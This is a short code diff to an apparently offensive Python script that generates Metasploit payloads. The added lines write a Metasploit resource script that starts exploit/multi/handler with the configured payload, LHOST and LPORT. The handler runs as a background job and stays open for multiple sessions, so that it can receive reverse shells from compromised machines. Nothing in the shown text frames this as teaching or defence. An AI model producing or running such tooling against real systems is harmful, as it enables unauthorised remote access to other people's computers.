@@ -18,3 +18,19 @@ def generate_payload(config):
         print("[!] Error:\n", result.stderr)
 
 generate_payload(payload_config)
+# Phase 3: Create Metasploit resource script for listener
+def generate_rc(config, filename="handler.rc"):
+    rc_content = f"""
+use exploit/multi/handler
+set payload {config['payload']}
+set LHOST {config['lhost']}
+set LPORT {config['lport']}
+set ExitOnSession false
+exploit -j
+"""
+    with open(filename, "w") as f:
+        f.write(rc_content.strip())
+    print(f"[+] Handler RC script written to {filename}")
+
+generate_rc(payload_config)
+
